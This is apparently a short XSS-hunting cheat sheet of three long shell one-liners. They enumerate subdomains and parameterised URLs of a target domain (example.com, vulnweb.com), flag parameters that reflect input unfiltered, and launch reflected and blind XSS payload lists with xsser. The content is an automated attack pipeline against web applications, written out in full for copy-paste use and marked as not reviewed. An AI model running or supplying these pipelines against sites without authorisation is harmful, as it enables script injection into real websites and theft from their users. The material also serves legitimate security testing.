# XSS Testing (not reviewed)

***

### XSS Discovery

#### Reflected XSS for Multiple Payload

```sh
subfinder -d "example.com" -all -recursive | httpx -mc 200 -silent | sed -E 's,https?://(www\.)?,,' | anew | urlfinder -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aE '\?.*=.*(&.*)?' | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | anew | rc -p "RXSS" -o rxss.txt;cxss -f rxss.txt -p "RXSS" -i "FUZZ" -s | grep -E "Unfiltered\(([2-9]|1[0-4])\):" | sed 's/URL:[[:space:]]*//g' | sed 's/ Param:.*$//' | anew>xss_unfilter.txt;xsser -f xss_unfilter.txt -p /home/haxshadow/Xss-payload/xss-hax.txt  -pl "FUZZ" -o Rxss_found.txt
```

#### Blind XSS Oneliners

```sh
subfinder -d "vulnweb.com" -all -recursive | httpx -mc 200 -silent | sed -E 's,https?://(www\.)?,,' | anew | urlfinder -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aE '\?.*=.*(&.*)?' | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | anew>bxss.txt;xsser -f bxss.txt -p /home/haxshadow/Xss-payload/blindXss.txt
```

#### RXSS / BXSS Both Finder

```sh
sudo mkdir -p --mode=777 all_xss/example.com/RXSS_BXSS;urlfinder -d "example.com" -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|jpeg|js|json|pdf|gif|xml|webp)($|\s|\?|&|#|/|\.)" | anew>all_xss/example.com/RXSS_BXSS/all_urls.txt;cat all_xss/example.com/RXSS_BXSS/all_urls.txt | grep -aE '\?.*=.*(&.*)?' | awk -F'[?&=]' '!seen[$1$2]++' | pvreplace -silent -fuzzing-type postfix | anew | tee all_xss/example.com/RXSS_BXSS/blind_xss_parameters.txt;cat all_xss/example.com/RXSS_BXSS/all_urls.txt | grep -aiE "contact|support|chatbot|ticket|comment|feedback|forms|surveys|forums|help|login|registration|register|signin|signup" | httpx -mc 200,302 -timeout 5 -duc -nc | anew | tee all_xss/example.com/RXSS_BXSS/blind_xss_pages.txt;cat all_xss/example.com/RXSS_BXSS/blind_xss_parameters.txt | grep -a "FUZZ" | sed 's/FUZZ//g' | httpx -mc 200 -timeout 5 -duc -nc | rc -p "RXSS" -o all_xss/example.com/RXSS_BXSS/reflected_xss_parameters.txt;cat all_xss/example.com/RXSS_BXSS/reflected_xss_parameters.txt | cxss -p "RXSS" -i "FUZZ" | grep -E "Unfiltered\(([1-9]|1[0-4])\): \[[\"'<>\$|\(\)\`:;{} ]{2,}\]" | sed 's/URL:[[:space:]]*//g' | sed 's/ Param:.*$//' | anew | tee all_xss/example.com/RXSS_BXSS/reflected_unfilter_xss_parameters.txt
```
